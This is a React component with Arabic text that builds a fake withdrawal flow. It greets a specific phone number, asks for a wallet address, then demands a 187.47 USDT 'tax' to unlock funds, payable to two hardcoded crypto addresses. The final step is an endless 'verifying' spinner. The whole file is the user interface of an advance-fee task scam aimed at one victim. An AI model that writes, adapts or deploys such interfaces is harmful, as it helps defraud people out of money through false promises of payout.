
import React, { useState } from 'react';
import { Copy, CheckCircle2, Loader2, ArrowLeft } from 'lucide-react';

const TransactionModal: React.FC = () => {
  const [step, setStep] = useState<number>(1);
  const [walletAddress, setWalletAddress] = useState<string>('');
  const [copied, setCopied] = useState<'bep20' | 'trc20' | null>(null);

  const copyToClipboard = (text: string, type: 'bep20' | 'trc20') => {
    navigator.clipboard.writeText(text);
    setCopied(type);
    setTimeout(() => setCopied(null), 2000);
  };

  const nextStep = () => setStep(prev => prev + 1);

  if (step === 0) return null;

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center px-4">
      {/* Blurred Backdrop - Reduced blur to sm */}
      <div className="absolute inset-0 bg-black/30 backdrop-blur-sm" />

      {/* Modal Container */}
      <div className="relative w-full max-w-sm bg-white rounded-[2.5rem] p-8 shadow-2xl overflow-hidden animate-in fade-in zoom-in duration-300">
        
        {/* Step 1: Welcome */}
        {step === 1 && (
          <div className="text-center">
            <div className="w-16 h-16 bg-blue-50 rounded-full flex items-center justify-center mx-auto mb-6">
              <span className="text-3xl">👋</span>
            </div>
            <h2 className="text-xl font-bold text-[#1C1C1C] mb-4">أهلاً بك 0936171898</h2>
            <p className="text-[#7A7A7A] leading-relaxed mb-8">
              تم حل أمر المهام ضمن اتفاق بروتوكول بين منصتنا ومنصة <span className="font-bold text-[#2F80ED]">mini pro</span>. اضغط التالي للمتابعة.
            </p>
            <button 
              onClick={nextStep}
              className="w-full bg-[#2F80ED] text-white py-4 rounded-2xl font-bold text-lg active:scale-[0.98] transition-all shadow-lg shadow-blue-100"
            >
              التالي
            </button>
          </div>
        )}

        {/* Step 2: Wallet Input */}
        {step === 2 && (
          <div>
            <h2 className="text-xl font-bold text-[#1C1C1C] mb-2 text-center">رابط المحفظة</h2>
            <p className="text-[#7A7A7A] text-sm text-center mb-6">
              يرجى إدخال رابط المحفظة التي تريد استقبال رصيدك إليها
            </p>
            <div className="mb-8">
              <input 
                type="text" 
                value={walletAddress}
                onChange={(e) => setWalletAddress(e.target.value)}
                placeholder="أدخل عنوان المحفظة هنا..."
                className="w-full bg-gray-50 border-2 border-gray-100 rounded-xl px-4 py-4 text-right focus:border-[#2F80ED] focus:outline-none transition-colors"
              />
            </div>
            <button 
              onClick={nextStep}
              disabled={!walletAddress.trim()}
              className={`w-full py-4 rounded-2xl font-bold text-lg transition-all ${
                walletAddress.trim() 
                ? 'bg-[#2F80ED] text-white shadow-lg shadow-blue-100 active:scale-[0.98]' 
                : 'bg-gray-200 text-gray-400 cursor-not-allowed'
              }`}
            >
              التالي
            </button>
          </div>
        )}

        {/* Step 3: Payment Info */}
        {step === 3 && (
          <div className="max-h-[80vh] overflow-y-auto custom-scrollbar">
            <h2 className="text-lg font-bold text-[#1C1C1C] mb-4 text-center">تفعيل قناة السحب</h2>
            <p className="text-[#7A7A7A] text-sm leading-relaxed mb-6 text-center">
               أهلاً بك 0936171898، بقي أمر إيداع مبلغ <span className="text-[#2F80ED] font-bold">187.47 USDT</span> لفتح قناة السحب. هذه الضريبة هي أجور منصتنا وليس لها أي صلة بمنصة mini pro.
            </p>

            <div className="space-y-4 mb-6">
              {/* BEP20 */}
              <div className="bg-gray-50 p-4 rounded-2xl border border-gray-100">
                <span className="text-xs font-bold text-gray-400 block mb-2">USDT BEP-20 (Binance Smart Chain)</span>
                <div className="flex items-center gap-2">
                  <code className="text-[10px] flex-1 break-all bg-white p-2 rounded border border-gray-100 text-left">0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d</code>
                  <button 
                    onClick={() => copyToClipboard('0xad24e7fcbbde3ca422d58d739c3f628fd7b0e03d', 'bep20')}
                    className="p-2 text-[#2F80ED] hover:bg-blue-50 rounded-lg transition-colors"
                  >
                    {copied === 'bep20' ? <CheckCircle2 size={20} /> : <Copy size={20} />}
                  </button>
                </div>
              </div>

              {/* TRC20 */}
              <div className="bg-gray-50 p-4 rounded-2xl border border-gray-100">
                <span className="text-xs font-bold text-gray-400 block mb-2">USDT TRC-20 (Tron Network)</span>
                <div className="flex items-center gap-2">
                  <code className="text-[10px] flex-1 break-all bg-white p-2 rounded border border-gray-100 text-left">TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai</code>
                  <button 
                    onClick={() => copyToClipboard('TXNSwDcprucSrrpyC6kLGLNrfiwHSRD8ai', 'trc20')}
                    className="p-2 text-[#2F80ED] hover:bg-blue-50 rounded-lg transition-colors"
                  >
                    {copied === 'trc20' ? <CheckCircle2 size={20} /> : <Copy size={20} />}
                  </button>
                </div>
              </div>
            </div>

            <div className="bg-yellow-50 p-4 rounded-2xl mb-6">
              <p className="text-[11px] text-yellow-700 leading-relaxed font-medium">
                ⚠️ يمكنك السحب فوراً عند دفع الضريبة وسوف تصل خلال 10 إلى 30 دقيقة كحد أقصى.
                <br />
                <strong>ملاحظة:</strong> يجب دفع الضريبة حصراً بعملة USDT.
              </p>
            </div>

            <button 
              onClick={nextStep}
              className="w-full bg-[#2F80ED] text-white py-4 rounded-2xl font-bold text-lg active:scale-[0.98] transition-all shadow-lg shadow-blue-100"
            >
              تم الإيداع
            </button>
          </div>
        )}

        {/* Step 4: Final Verification */}
        {step === 4 && (
          <div className="text-center py-4">
            <div className="relative w-20 h-20 mx-auto mb-6">
              <Loader2 className="w-full h-full text-[#2F80ED] animate-spin" strokeWidth={1} />
              <div className="absolute inset-0 flex items-center justify-center">
                <CheckCircle2 className="text-[#2F80ED]/20 w-10 h-10" />
              </div>
            </div>
            <h2 className="text-xl font-bold text-[#1C1C1C] mb-4">جارٍ التحقق...</h2>
            <p className="text-[#7A7A7A] leading-relaxed">
              الرجاء الانتظار للتأكد من عملية الإيداع. يتم معالجة طلبك حالياً.
            </p>
          </div>
        )}
      </div>
    </div>
  );
};

export default TransactionModal;
